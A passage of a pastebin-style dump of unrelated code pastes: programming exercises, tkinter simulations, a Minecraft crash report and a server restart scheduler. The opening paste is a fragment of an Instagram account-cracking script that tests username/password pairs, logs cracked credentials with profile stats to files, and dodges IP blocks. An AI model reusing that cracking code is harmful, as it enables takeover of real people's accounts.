                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        "
mVBTNLTG,Untitled,Sreekar_0125,C++,Thursday 7th of March 2024 11:36:48 PM CDT,"T query(size_t treeIndex, size_t left, size_t right)
    {
        cerr << ""qL : "" << queryLeft << ' ' << ""qR : "" << queryRight << endl;
        cerr << treeIndex << ' ' << left << ' ' << right << endl;
        if (queryLeft <= left && right <= queryRight)
            return tree[treeIndex];

        size_t mid = left + (right - left) / 2;
        cerr << ""mid : "" << mid << endl;
        if (queryRight <= mid)
            return query(2 * treeIndex + 1, left, mid);
        if (queryLeft > mid)
        {
           return query(2 * treeIndex + 2, mid + 1, right); 
        }
        
        int Left = query(2 * treeIndex + 1, left, mid);
        int Right = query(2 * treeIndex + 2, mid + 1, right);
        
        if(treeIndex == 0)
        {
            cerr << ""Final Returning : "" << Left << ' ' << Right << endl;
        }
            
        return max(Left, Right);
    }"
YEn5uM66,Exception_%s,naren_paste,Python,Thursday 7th of March 2024 11:30:43 PM CDT,"from functools import reduce
import logging as logs

logs.basicConfig(
    filename=""calc.log"",
    level=logs.DEBUG,
    format=""[%(asctime)s] %(lineno)d-%(name)s-%(levelname)s-%(message)s"",
)


class cal_culator:
    def __init__(calc, user_name):
        try:
            logs.info(""taking the username"")
            calc.username = user_name
            logs.info(user_name)
        except Exception as e:
            logs.error(e)

    def add_tion(calc, *args):
        try:
            logs.info(""taking the data from user to produce addition of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the sum is',sum(args))
            return calc.username, sum(args)

        except TypeError as t:
            logs.error(t)

    def sub_traction(calc, *args):

        try:
            logs.info(""taking the data tpo produce the subtraction "")
            logs.info(""enterd data is %s"", args)
            # logs.info('the subtraction is',reduce(lambda a,b:a-b,args))
            return calc.username, reduce(lambda a, b: a - b, args)
            logs.info(args)
        except TypeError as t:
            logs.error(t)

    def multi_plication(calc, *args):
        try:
            logs.info(""taking the data to produce multiplication of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the product is',reduce (lambda a,b:a*b,args))
            return calc.username, reduce(lambda a, b: a * b, args)
            logs.info(args)
        except TypeError as t:
            logs.error(t)

    def div_sion(calc, *args):
        try:
            logs.info(""taking the data to produce division of numbers"")
            logs.info(""enterd data is %s"", args)
            # logs.info('the product is',reduce (lambda a,b:a/b,args))
            return calc.username, reduce(lambda a, b: a / b, args)
            logs.info(args)
            logs.info(args)
        except Exception as e:
            logs.error(e)


obj = cal_culator(""sushant"")
print(obj.add_tion(*[1, 2, 3]))
print(obj.sub_traction(*[1, 2, 3]))
print(obj.multi_plication(*[1, 2, 3]))
print(obj.div_sion(*[1, 2, 3]))
"
aUC8WWGa,# tk_rock_paper_scissors_sim2.py,here2share,Python,Thursday 7th of March 2024 11:00:15 PM CDT,"# tk_rock_paper_scissors_sim2.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 480
WINDOW_HEIGHT = 480
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 120
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 21
CONVERT_RADIUS = 18
SPEED = 1

root = tk.Tk()
root.title(""tk_rock_paper_scissors_sim"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT + 100, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT + 100, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if chase[entity] == entity2:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

r = 10
def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - r, y - r, x + r, y + r), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
	draw = ImageDraw.Draw(pil_image)

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 100, anchor='nw', image=photo_image)
	canvas.create_text(CX, 36, text=food_chain, anchor='center', fill=""gray"", font=(""Verdana"", 24, ""italic""))
	root.update()"
gb1EFf6C,Untitled,Ionian_Caster,C,Thursday 7th of March 2024 10:55:04 PM CDT,"#include <stdio.h>
#include <stdlib.h>

#define SIZE 100

void fillRandom(int* array, int size, int border) {
    for (int i = 0; i < size; ++i) {
        *(array + i) = rand() % border;
    }
}

void printIntArray(int* array, int size, int offset) {
    char format[7];
    sprintf(format, ""%%%dd"", offset);
    for (int i = 0; i < size; ++i) {
        printf(format, array[i]);
        if (i != size - 1)
            printf("","");
    }
    printf(""\n"");
}

void swap(int* lhs, int* rhs) {
    *lhs ^= *rhs;
    *rhs ^= *lhs;
    *lhs ^= *rhs;
}

void bubbleSort(int* array, int size) {
    for (int i = 0; i < size; ++i) {
        for (int j = 0; j < size - 1; ++j) {
            if (array[j] > array[j + 1]) {
                swap(&array[j], &array[j + 1]);
            }
        }
    }
}

int main(void) {
    int arr[SIZE];
    fillRandom(arr, SIZE, 100);
    printIntArray(arr, SIZE, 3);
    bubbleSort(arr, SIZE);
    printIntArray(arr, SIZE, 3);
    return 0;
}
"
L05ySSXr,Untitled,Ionian_Caster,C,Thursday 7th of March 2024 10:39:35 PM CDT,"#include <stdio.h>

#define UNITE 1
#define UNITED 2

int meow(int kittensOfTheWorld) {
    if (kittensOfTheWorld < UNITED) return kittensOfTheWorld;

    return meow(kittensOfTheWorld - UNITE) + meow(kittensOfTheWorld - UNITED);
}

int fibLoop(int num) {
    int prevprev = 0;
    int prev = 1;

    if (num < UNITED) return num;
    int i = 2;
    int current = 0;

    do {
        current = prev + prevprev;
        prevprev = prev;
        prev = current;
        i++;
    } while (i <= num);

    return current;
}

int main(void) {
    for (int i = 0; i < 50; ++i) {
        printf(""%dth Fibonacci number is: %d\n"", i, fibLoop(i));
    }
    return 0;
}
"
t6hAx8y6,# tk_rock_paper_scissors_sim.py,here2share,Python,Thursday 7th of March 2024 10:24:31 PM CDT,"# tk_rock_paper_scissors_sim.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 150
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 21
CONVERT_RADIUS = 18
SPEED = 1

root = tk.Tk()
root.title(""tk_rock_paper_scissors_sim"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT + 100, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT + 100, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if distance < CONVERT_RADIUS and chase[entity] == entity2:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)
while True:

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 100, anchor='nw', image=photo_image)
	canvas.create_text(CX, 36, text=food_chain, anchor='center', fill=""gray"", font=(""Verdana"", 24, ""italic""))
	root.update()"
jXrg8gRj,crash-2024-03-07_23.51.02-client,Urara_Chiya,Java,Thursday 7th of March 2024 10:07:26 PM CDT,"---- Minecraft Crash Report ----

WARNING: coremods are present:
  FugueLoadingPlugin (Fugue-1.12.2-0.5.4.jar)
  MixinBooter (cleanroom-15.24.0.3029-universal.jar)
Contact their authors BEFORE contacting forge

// My bad.

Time: 2024-03-08 11:35
Description: There was a severe problem during mod loading that has caused the game to fail

net.minecraftforge.fml.common.LoaderExceptionModCrash: Caught exception from Railcraft (railcraft)
Caused by: net.minecraft.util.ReportedException: Loading Railcraft Module
	at mods.railcraft.common.modules.RailcraftModuleManager.processStage(RailcraftModuleManager.java:266)
	at mods.railcraft.common.modules.RailcraftModuleManager.preInit(RailcraftModuleManager.java:202)
	at mods.railcraft.common.core.Railcraft.preInit(Railcraft.java:116)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at net.minecraftforge.fml.common.FMLModContainer.handleModStateEvent(FMLModContainer.java:637)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:85)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:142)
	at com.google.common.eventbus.Subscriber.lambda$dispatchEvent$0(Subscriber.java:71)
	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:68)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:111)
	at com.google.common.eventbus.EventBus.post(EventBus.java:270)
	at net.minecraftforge.fml.common.LoadController.sendEventToModContainer(LoadController.java:279)
	at net.minecraftforge.fml.common.LoadController.propogateStateMessage(LoadController.java:257)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.google.common.eventbus.Subscriber.invokeSubscriberMethod(Subscriber.java:85)
	at com.google.common.eventbus.Subscriber$SynchronizedSubscriber.invokeSubscriberMethod(Subscriber.java:142)
	at com.google.common.eventbus.Subscriber.lambda$dispatchEvent$0(Subscriber.java:71)
	at com.google.common.util.concurrent.DirectExecutor.execute(DirectExecutor.java:31)
	at com.google.common.eventbus.Subscriber.dispatchEvent(Subscriber.java:68)
	at com.google.common.eventbus.Dispatcher$PerThreadQueuedDispatcher.dispatch(Dispatcher.java:111)
	at com.google.common.eventbus.EventBus.post(EventBus.java:270)
	at net.minecraftforge.fml.common.LoadController.distributeStateMessage(LoadController.java:193)
	at net.minecraftforge.fml.common.Loader.preinitializeMods(Loader.java:630)
	at net.minecraftforge.fml.client.FMLClientHandler.beginMinecraftLoading(FMLClientHandler.java:251)
	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:467)
	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:378)
	at net.minecraft.client.main.Main.main(SourceFile:123)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at com.cleanroommc.bouncepad.Bouncepad.launch(Bouncepad.java:136)
	at com.cleanroommc.bouncepad.Bouncepad.main(Bouncepad.java:38)
	at org.prismlauncher.launcher.impl.StandardLauncher.launch(StandardLauncher.java:87)
	at org.prismlauncher.EntryPoint.listen(EntryPoint.java:129)
	at org.prismlauncher.EntryPoint.main(EntryPoint.java:70)
Caused by: java.lang.ExceptionInInitializerError
	at mods.railcraft.common.blocks.aesthetics.metals.BlockMetal.initializeDefinition(BlockMetal.java:66)
	at mods.railcraft.common.blocks.RailcraftBlocks$BlockDef.register(RailcraftBlocks.java:247)
	at mods.railcraft.common.blocks.RailcraftBlocks$BlockDef.access$100(RailcraftBlocks.java:199)
	at mods.railcraft.common.blocks.RailcraftBlocks.register(RailcraftBlocks.java:275)
	at java.base/java.lang.Iterable.forEach(Iterable.java:75)
	at mods.railcraft.common.modules.RailcraftModulePayload$BaseModuleEventHandler.preInit(RailcraftModulePayload.java:78)
	at mods.railcraft.common.modules.RailcraftModuleManager$Stage$2.passToModule(RailcraftModuleManager.java:312)
	at mods.railcraft.common.modules.RailcraftModuleManager.processStage(RailcraftModuleManager.java:253)
	... 38 more
Caused by: java.lang.ClassCastException: class mods.railcraft.common.blocks.aesthetics.metals.BlockMetal
	at java.base/java.lang.Class.asSubclass(Class.java:4102)
	at mods.railcraft.common.plugins.forge.DataManagerPlugin.create(DataManagerPlugin.java:137)
	at mods.railcraft.common.carts.EntityTunnelBore.<clinit>(EntityTunnelBore.java:90)
	... 46 more


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- System Details --
Details:
	Minecraft Version: 1.12.2
	Operating System: Windows 11 (amd64) version 10.0
	Java Version: 21.0.2, Microsoft
	Java VM Version: OpenJDK 64-Bit Server VM (mixed mode, sharing), Microsoft
	Memory: 249575704 bytes (238 MB) / 536870912 bytes (512 MB) up to 6442450944 bytes (6144 MB)
	JVM Flags: 21 total; -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xms512m -Xmx6144m
	IntCache: cache: 0, tcache: 0, allocated: 0, tallocated: 0
	FML: MCP 9.42 Powered by Cleanroom 14.23.5.0 8 mods loaded, 8 mods active
	States: 'U' = Unloaded 'L' = Loaded 'C' = Constructed 'H' = Pre-initialized 'I' = Initialized 'J' = Post-initialized 'A' = Available 'D' = Disabled 'E' = Errored

	| State | ID            | Version      | Source                               | Signature                                |
	|:----- |:------------- |:------------ |:------------------------------------ |:---------------------------------------- |
	| LCH   | minecraft     | 1.12.2       | minecraft.jar                        | None                                     |
	| LCH   | mcp           | 9.42         | minecraft.jar                        | None                                     |
	| LCH   | configanytime | 2.0          | minecraft.jar                        | None                                     |
	| LCH   | FML           | 8.0.99.99    | cleanroom-15.24.0.3029-universal.jar | None                                     |
	| LCH   | forge         | 14.23.5.0    | cleanroom-15.24.0.3029-universal.jar | None                                     |
	| LCH   | mixinbooter   | 10.0         | minecraft.jar                        | None                                     |
	| LCH   | fugue         | 1.12.2-0.5.4 | Fugue-1.12.2-0.5.4.jar               | None                                     |
	| LCE   | railcraft     | 12.0.0       | railcraft-12.0.0.jar                 | a0c255ac501b2749537d5824bb0f0588bf0320fa |

	Loaded coremods (and transformers): 
FugueLoadingPlugin (Fugue-1.12.2-0.5.4.jar)
  com.cleanroommc.transformer.CommonRegistrar$Transformer
MixinBooter (cleanroom-15.24.0.3029-universal.jar)
  
	GL info: ' Vendor: 'Intel' Version: '4.6.0 - Build 31.0.101.2125' Renderer: 'Intel(R) Iris(R) Plus Graphics'"
Jg2c7JQ7,# tk_war.py,here2share,Python,Thursday 7th of March 2024 09:45:17 PM CDT,"# tk_war.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 500
WINDOW_HEIGHT = 500
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 150
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 25
CONVERT_RADIUS = 20
SPEED = 1

root = tk.Tk()
root.title(""tk_war"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				if distance < CONVERT_RADIUS:
					entities[j] = (x2, y2, entity)
				return x, y
	return movement(x, y, CX, CY)

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
draw = ImageDraw.Draw(pil_image)
while True:

	for i, (x, y, entity) in enumerate(entities):
		if_rev = math.pi
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 0, anchor='nw', image=photo_image)
	root.update()"
0sgxjnXC,Scheduler.xml,iKurdo,XML,Thursday 7th of March 2024 08:47:02 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes"" ?>
<Scheduler>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='0'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='1'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='2'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='3'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='4'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='5'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='6'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='7'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='8'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='9'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='10'>
		<day>1,2,3,4,5,6,7</day>
		<start>23:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='11'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:00:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en una hora!</cmd>
	</job>
	<!-- El servidor se reinicia en 30 minutos -->
	<job id='12'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:30:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 30 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 20 minutos -->
	<job id='13'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:40:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 20 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 15 minutos -->
	<job id='14'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:45:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 15 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 10 minutos -->
	<job id='15'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:50:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 10 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 5 minutos -->
	<job id='16'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:55:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 5 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 3 minutos -->
	<job id='17'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:57:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 3 minutos!</cmd>
	</job>
	<!-- El servidor se reinicia en 2 minute -->
	<job id='18'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:58:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 2 minute!!!</cmd>
	</job>
	<!-- El servidor se reinicia en 1 minute -->
	<job id='19'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:59:00</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>say -1 Alerta: Este servidor se reiniciará automáticamente en 1 minute!!!</cmd>
	</job>
	<!-- Server restarting -->
	<job id='20'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:59:50</start>
		<runtime>000001</runtime>
		<loop>10</loop>
		<cmd>say -1 Alerta: este servidor se está reiniciando automáticamente ahora!!!</cmd>
	</job>
	<!-- Shutdown Server -->
	<job id='21'>
		<day>1,2,3,4,5,6,7</day>
		<start>03:59:55</start>
		<runtime>000000</runtime>
		<loop>0</loop>
		<cmd>#shutdown</cmd>
	</job>
	<!-- El servidor se reinicia en 1 hora -->
	<job id='22'>
		<day>1,2,3,4,5,6,7</day>
